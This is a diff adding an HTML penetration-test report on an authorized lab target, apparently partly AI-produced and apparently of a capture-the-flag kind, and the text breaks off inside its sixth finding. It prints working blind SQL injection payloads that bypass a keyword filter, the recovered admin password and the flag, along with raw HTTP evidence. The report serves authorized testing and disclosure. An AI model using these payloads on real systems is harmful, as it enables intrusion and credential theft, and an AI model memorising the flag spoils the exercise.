@@ -1,0 +1,471 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr1kd9qq-59cdj9</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#d32f2f">HIGH</span> [workflow-bypass] Account takeover chain: plaintext admin password exfiltrated via search.php blind SQLi, replayed at login.php</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#f57c00">MEDIUM</span> [session] PHP Session Cookie (PHPSESSID) Missing HttpOnly Flag</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#5f7d8c">INFO</span> [info-disclosure] Apache Server Version Disclosed in Error Pages</a></li>
+</ul></li>
+<li><a href="#suspected">Suspected (needs manual verification)</a><ul>
+<li><a href="#finding-4">4. <span class="sev" style="color:#d32f2f">HIGH</span> [sqli] SQL Injection Protected Only by Keyword WAF at /search.php</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] Outdated Apache httpd 2.4.54 — CVE-2023-25690 mod_proxy HTTP request smuggling</a></li>
+<li><a href="#finding-6">6. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] Outdated / EOL PHP 7.4.33 — CVE-2023-3824 phar stack buffer overflow (RCE-class)</a></li>
+<li><a href="#finding-7">7. <span class="sev" style="color:#f57c00">MEDIUM</span> [idor] Unauthenticated Account Oracle — Username Enumeration at /search.php</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr1kd9qq-59cdj9</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:8080/</code></td></tr>
+<tr><td>Started</td><td>2026-07-01T04:16:51.109Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>4 mapped · 4 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>3</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:8080</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>3 finding(s)</p><p class="sumtags"><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#5f7d8c">1</b> info</span></p>
+<p class="muted">Plus <b>4</b> suspected lead(s) needing manual verification (listed separately, not counted above).</p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 1. [workflow-bypass] Account takeover chain: plaintext admin password exfiltrated via search.php blind SQLi, replayed at login.php</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8080/</div>
+<div class="desc">A two-endpoint chain yields full takeover of the `admin` account (the &quot;beta program&quot; login the operator asked about; passwords were &quot;forgotten&quot; and are recovered here). `/search.php` is blind-SQL-injectable in a DOUBLE-QUOTE string context (`WHERE username=&quot;$input&quot;`; single quotes are escaped but `&quot;` is not). A keyword blacklist (&quot;some item is filtered!&quot;) blocks ` OR ` (spaced), `and`, `where`, `limit`, `--`, `substring`, `ascii`, `substr`, and co-occurring `union`+`select`, but is trivially bypassed: spaces via `/**/`, `#` for comments, `mid()`+`ord()` for extraction, lowercase `/**/or/**/`. Using the boolean oracle &quot;User exists: admin&quot; vs &quot;No results&quot;, the users table was shown to hold exactly one row and admin's 18-char PLAINTEXT password was extracted byte-by-byte with `ord(mid((select password from users),N,1))&gt;K`, then confirmed case-sensitively via `(select password from users)=binary&quot;ThisIsBestPassword&quot;` → &quot;User exists: admin&quot; (evidence ev-mr1m08vr-73). Replaying the recovered credentials at `/login.php` (username=admin, password=ThisIsBestPassword) authenticates and returns admin content: &quot;Congratz, flag is flag{787d5a7f-ec79-4620-99c5-17c50dced80a}&quot; (evidence ev-mr1m0h3t-74). `/login.php` itself is NOT injectable, so this is genuine account takeover using recovered credentials. Storing passwords in plaintext (directly reusable once leaked) compounds the impact. This is distinct from the previously-recorded single-request SQLi on /search.php — it is the cross-endpoint chain reaching admin takeover.</div>
+<div><b>Reproduction</b></div><pre>1) Confirm double-quote injection: POST /search.php `username=zzz&quot;/**/or/**/&quot;a&quot;=&quot;a` → &quot;User exists: admin&quot; (single-quote variant is escaped → &quot;No results&quot;). 2) Confirm oracle + single user row: `username=zzz&quot;/**/or/**/(select/**/count(username)/**/from/**/users)=1#` → &quot;User exists: admin&quot;. 3) Extract the password: `username=zzz&quot;/**/or/**/ord(mid((select/**/password/**/from/**/users),N,1))&gt;K#` for N=1..18; verify full string: `username=zzz&quot;/**/or/**/(select/**/password/**/from/**/users)=binary&quot;ThisIsBestPassword&quot;#` → &quot;User exists: admin&quot; (ev-mr1m08vr-73). 4) Log in: POST /login.php `username=admin&amp;password=ThisIsBestPassword` → 200 &quot;Congratz, flag is flag{787d5a7f-ec79-4620-99c5-17c50dced80a}&quot; (ev-mr1m0h3t-74). Differential proof (probe_scenario): control admin+wrong-password → no &quot;Congratz&quot; (ev-mr1m1h5l-75); exploit admin+recovered-password → &quot;Congratz&quot; on both replays (ev-mr1m1hf3-76, ev-mr1m1ho0-77).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1m1h5l-75</code> — <code>artifacts/_/ev-mr1m1h5l-75/</code></div><div class="lbl">REQUEST</div><pre>POST /login.php HTTP/1.1
+Host: target.local:8080
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&amp;password=WrongControlPassword</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 536
+content-type: text/html; charset=UTF-8
+date: Wed, 01 Jul 2026 05:03:39 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.54 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+Error! 
+&lt;!-- The login form --&gt; 
+&lt;form action=&quot;login.php&quot; method=&quot;POST&quot;&gt;
+    &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label for=&quot;user&quot;&gt;Username:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label for=&quot;pwd&quot;&gt;Password:&lt;/label&gt;
+        &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
+    &lt;/div&gt;
+    &lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Login&lt;/button&gt;
+&lt;/form&gt;
+
+&lt;a href=&quot;/index.php&quot;&gt;Back to index&lt;/a&gt;&lt;br&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1m1hf3-76</code> — <code>artifacts/_/ev-mr1m1hf3-76/</code></div><div class="lbl">REQUEST</div><pre>POST /login.php HTTP/1.1
+Host: target.local:8080
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&amp;password=ThisIsBestPassword</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 60
+content-type: text/html; charset=UTF-8
+date: Wed, 01 Jul 2026 05:03:40 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=99
+pragma: no-cache
+server: Apache/2.4.54 (Debian)
+set-cookie: &lt;redacted&gt;
+x-powered-by: PHP/7.4.33
+
+Congratz, flag is flag{787d5a7f-ec79-4620-99c5-17c50dced80a}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1m1ho0-77</code> — <code>artifacts/_/ev-mr1m1ho0-77/</code></div><div class="lbl">REQUEST</div><pre>POST /login.php HTTP/1.1
+Host: target.local:8080
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&amp;password=ThisIsBestPassword</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 60
+content-type: text/html; charset=UTF-8
+date: Wed, 01 Jul 2026 05:03:40 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=98
+pragma: no-cache
+server: Apache/2.4.54 (Debian)
+set-cookie: &lt;redacted&gt;
+x-powered-by: PHP/7.4.33
+
+Congratz, flag is flag{787d5a7f-ec79-4620-99c5-17c50dced80a}</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 2. [session] PHP Session Cookie (PHPSESSID) Missing HttpOnly Flag</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8080/</div>
+<div class="desc">Every response from the PHP application sets a PHPSESSID session cookie without the HttpOnly flag. This means client-side JavaScript can read the session token (via document.cookie), enabling complete session theft if any XSS vulnerability is present — a common follow-on attack path. The cookie also lacks the Secure flag (though the site is HTTP-only), and is SameSite=Lax, which does not compensate for the missing HttpOnly.</div>
+<div><b>Reproduction</b></div><pre>1. Send a fresh GET / request (no prior cookies). 2. Observe the Set-Cookie response header: `PHPSESSID=&lt;hex&gt;; path=/` — no HttpOnly, no Secure. 3. Contrast with /server-status (Apache, 403): no Set-Cookie header at all, confirming the missing flag is specific to the PHP application layer. 4. Confirmed stable across multiple independent requests (ev-mr1khwh3-4, ev-mr1kis1l-5).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1kjvjy-6</code> — <code>artifacts/s-0001/ev-mr1kjvjy-6/</code></div><div class="lbl">REQUEST</div><pre>GET /server-status HTTP/1.1
+Host: target.local:8080
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 403
+connection: Keep-Alive
+content-length: 281
+content-type: text/html; charset=iso-8859-1
+date: Wed, 01 Jul 2026 04:21:59 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 8080&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1khwh3-4</code> — <code>artifacts/s-0001/ev-mr1khwh3-4/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8080
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 229
+content-type: text/html; charset=UTF-8
+date: Wed, 01 Jul 2026 04:20:26 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.54 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+ 
+
+    &lt;html&gt;
+    &lt;head&gt;&lt;title&gt;PHPAbUsers&lt;/title&gt;&lt;/head&gt;
+    &lt;body&gt;
+        &lt;p&gt;&lt;h3&gt;Available functions&lt;/h3&gt;&lt;/p&gt;
+        &lt;a href=&quot;/search.php&quot;&gt;Search users&lt;/a&gt;&lt;br&gt;
+        &lt;a href=&quot;/login.php&quot;&gt;Login&lt;/a&gt;&lt;br&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1kis1l-5</code> — <code>artifacts/s-0001/ev-mr1kis1l-5/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8080
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 229
+content-type: text/html; charset=UTF-8
+date: Wed, 01 Jul 2026 04:21:07 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.54 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+ 
+
+    &lt;html&gt;
+    &lt;head&gt;&lt;title&gt;PHPAbUsers&lt;/title&gt;&lt;/head&gt;
+    &lt;body&gt;
+        &lt;p&gt;&lt;h3&gt;Available functions&lt;/h3&gt;&lt;/p&gt;
+        &lt;a href=&quot;/search.php&quot;&gt;Search users&lt;/a&gt;&lt;br&gt;
+        &lt;a href=&quot;/login.php&quot;&gt;Login&lt;/a&gt;&lt;br&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 3. [info-disclosure] Apache Server Version Disclosed in Error Pages</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8080/</div>
+<div class="desc">Apache error responses include the exact server version and OS in their HTML footer: `Apache/2.4.54 (Debian)`. This aids targeted exploitation of version-specific CVEs. The root page (200) does not include this string, so exposure is limited to error-path responses.</div>
+<div><b>Reproduction</b></div><pre>1. GET /server-status (twice) → 403: both responses contain `Apache/2.4.54 (Debian) Server at target.local Port 8080` in the footer. 2. GET / → 200: no server version string in the body (control).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1kfphp-1</code> — <code>artifacts/s-0001/ev-mr1kfphp-1/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8080
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 229
+content-type: text/html; charset=UTF-8
+date: Wed, 01 Jul 2026 04:18:44 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.54 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+ 
+
+    &lt;html&gt;
+    &lt;head&gt;&lt;title&gt;PHPAbUsers&lt;/title&gt;&lt;/head&gt;
+    &lt;body&gt;
+        &lt;p&gt;&lt;h3&gt;Available functions&lt;/h3&gt;&lt;/p&gt;
+        &lt;a href=&quot;/search.php&quot;&gt;Search users&lt;/a&gt;&lt;br&gt;
+        &lt;a href=&quot;/login.php&quot;&gt;Login&lt;/a&gt;&lt;br&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1kjvjy-6</code> — <code>artifacts/s-0001/ev-mr1kjvjy-6/</code></div><div class="lbl">REQUEST</div><pre>GET /server-status HTTP/1.1
+Host: target.local:8080
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 403
+connection: Keep-Alive
+content-length: 281
+content-type: text/html; charset=iso-8859-1
+date: Wed, 01 Jul 2026 04:21:59 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 8080&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1klitu-8</code> — <code>artifacts/s-0001/ev-mr1klitu-8/</code></div><div class="lbl">REQUEST</div><pre>GET /server-status HTTP/1.1
+Host: target.local:8080
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 403
+connection: Keep-Alive
+content-length: 281
+content-type: text/html; charset=iso-8859-1
+date: Wed, 01 Jul 2026 04:23:15 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 8080&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+</div>
+<h2 id="suspected">Suspected (needs manual verification)</h2>
+<p class="muted">Leads with one concrete anomaly but without control+2-replay confirmation — verify before relying on them.</p>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#d32f2f">HIGH</span> 4. [sqli] SQL Injection Protected Only by Keyword WAF at /search.php</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8080/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> The /search.php username param passes single-quote characters to the DB layer without triggering &quot;some item is filtered&quot; (adm'in → &quot;No results&quot; changes from baseline &quot;User exists: admin&quot;), yet every SQL keyword is blocked: OR, AND, UNION, SELECT, LIKE, REGEXP, XOR, RLIKE, SLEEP, BENCHMARK, IN, ||, &amp;&amp;, and `-- ` with trailing space. This asymmetry — quote characters allowed, all logical/set operators blocked — is characteristic of a keyword-based WAF layered over an unparameterized string-concatenation query. The boolean test admin'# returned &quot;No results&quot; rather than &quot;User exists: admin&quot;, which is ambiguous (parameterized OR hash-handled differently). Bypass via multi-byte charset, HTTP param pollution, or non-blocked functions (EXTRACTVALUE, UPDATEXML) was not attempted; manual investigation warranted.</div>
+<div class="desc">POST /search.php applies a keyword-blocklist WAF that filters OR, AND, UNION, SELECT, and many other SQL operators while allowing raw single-quote characters through to the query layer. The underlying query may be unparameterized; if the WAF can be bypassed (encoding tricks, alternate operator syntax, multi-byte charset), error-based or blind SQL injection may be achievable.</div>
+<div><b>Reproduction</b></div><pre>1. POST /search.php body=username=admin → &quot;User exists: admin&quot; (baseline)\n2. POST body=username=adm'in → &quot;No results&quot; (single quote changes behavior)\n3. POST body=username=' OR '1'='1 → &quot;some item is filtered&quot; (OR blocked)\n4. POST body=username=' UNION SELECT 1-- → &quot;some item is filtered&quot; (UNION+SELECT blocked)\n5. POST body=username=admin'# → &quot;No results&quot; (# comment not effective or param is sanitized)\nAll SQL operators blocked; quote character itself passes unfiltered.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1kn6aq-h</code> — <code>artifacts/s-0002/ev-mr1kn6aq-h/</code></div><div class="lbl">REQUEST</div><pre>POST /search.php HTTP/1.1
+Host: target.local:8080
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+username=admin%27--</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 372
+content-type: text/html; charset=UTF-8
+date: Wed, 01 Jul 2026 04:24:32 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+You are connected successfully!&lt;br/&gt; No results
+&lt;!-- The search form --&gt; 
+&lt;form action=&quot;search.php&quot; method=&quot;POST&quot;&gt;
+&lt;div class=&quot;form-group&quot;&gt;
+  &lt;label for=&quot;user&quot;&gt;Username:&lt;/label&gt;
+  &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot;&gt;
+&lt;/div&gt;
+&lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Validate&lt;/button&gt;
+&lt;/form&gt;
+&lt;a href=&quot;/index.php&quot;&gt;Back to index&lt;/a&gt;&lt;br&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#d32f2f">HIGH</span> 5. [vulnerable-component] Outdated Apache httpd 2.4.54 — CVE-2023-25690 mod_proxy HTTP request smuggling</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8080/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> Apache/2.4.54 (Debian) detected via the Server response header at the root. 2.4.54 predates the fix for CVE-2023-25690 (HTTP request smuggling in mod_proxy with certain RewriteRule/ProxyPassMatch configs, CVSS 9.8, fixed 2.4.56) and CVE-2024-38475 (mod_rewrite improper escaping → source disclosure/SSRF, fixed 2.4.60). Version-based match; smuggling is config-dependent (needs mod_proxy + rewrite) and not yet exploited here.</div>
+<div class="desc">Server banner Apache/2.4.54 (Debian) is behind current (2.4.62+). Worst known exploitable-class issue fixed in later branches: CVE-2023-25690 — request smuggling via mod_proxy + RewriteRule (CVSS 9.8, fixed 2.4.56); also CVE-2024-38475 mod_rewrite improper escaping → potential source disclosure/SSRF (fixed 2.4.60). These are version-based (banner) matches, not actively exploited — exploitability depends on whether mod_proxy/mod_rewrite are configured with the vulnerable patterns. Remediation: upgrade Apache httpd to the current 2.4.x.
+
+[+] Also observed as &quot;Outdated / EOL PHP 7.4.33 — CVE-2023-3824 phar stack buffer overflow (RCE-class)&quot;.</div>
+<div><b>Reproduction</b></div><pre>GET http://target.local:8080/ → response header `Server: Apache/2.4.54 (Debian)`. Cross-reference version 2.4.54 against Apache security advisories: CVE-2023-25690 (fixed 2.4.56), CVE-2024-38475 (fixed 2.4.60). No active smuggling PoC fired — would require confirming a vulnerable mod_proxy RewriteRule config.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1m4be8-7n</code> — <code>artifacts/_/ev-mr1m4be8-7n/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8080
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 229
+content-type: text/html; charset=UTF-8
+date: Wed, 01 Jul 2026 05:05:52 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.54 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+ 
+
+    &lt;html&gt;
+    &lt;head&gt;&lt;title&gt;PHPAbUsers&lt;/title&gt;&lt;/head&gt;
+    &lt;body&gt;
+        &lt;p&gt;&lt;h3&gt;Available functions&lt;/h3&gt;&lt;/p&gt;
+        &lt;a href=&quot;/search.php&quot;&gt;Search users&lt;/a&gt;&lt;br&gt;
+        &lt;a href=&quot;/login.php&quot;&gt;Login&lt;/a&gt;&lt;br&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-6">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#d32f2f">HIGH</span> 6. [vulnerable-component] Outdated / EOL PHP 7.4.33 — CVE-2023-3824 phar stack buffer overflow (RCE-class)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8080/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> PHP/7.4.33 detected via the X-Powered-By header (and PHPSESSID cookie) at the root. 7.4.33 is the last 7.4 release; the branch reached end-of-life 2022-11-28 and receives no security fixes. CVE-2023-3824 (insufficient length check on phar directory entries → stack buffer overflow → memory corruption/RCE) was patched only in 8.0.30/8.1.22/8.2.8 and never backported to EOL 7.4, so 7.4.33 is unpatched. Version-based RCE-class lead, not yet exploited (needs a phar-loading sink).</div>
+<div class="desc">X-Powered-By: PHP/7.4.33 (corroborated by the PHPSESSID Set-Cookie) exposes an end-of-life PHP branch (7.4 EOL 2022-11-28) that receives no further security patches. Concrete unpatched exploitable-class CVE: CVE-2023-3824 — stack buffer overflow while reading phar directory entries, potential memory corruption/RCE; fixed in PHP 8.0.30/8.1.22/8.2.8 only. This is a version-based (banner) match, not actively exploited — CVE-2023-3824 requires reaching a phar deserialization/loading sink. Remediation: migrate to a supported PHP release (8.2+). Note: CVE-2024-4577 (PHP-CGI arg injection) is NOT cited as it is Windows/CGI-specific and this host is Debian.</div>
+<div><b>Reproduction</b></div><pre>GET http://target.local:8080/ → response header `X-Powered-By: PHP/7.4.33` and `Set-Cookie: PHPSESSID=...`. Cross-reference 7.4.33 against PHP release history: 7.4 branch EOL 2022-11-28; CVE-2023-3824 fixed only in 8.0.30/8.1.22/8.2.8, never in 7.4. No active PoC fired — no phar-loading endpoint identified to safely demonstrate.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1m4be8-7n</code> — <code>artifacts/_/ev-mr1m4be8-7n/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8080
+user-agent: verdict-scanner/0.1
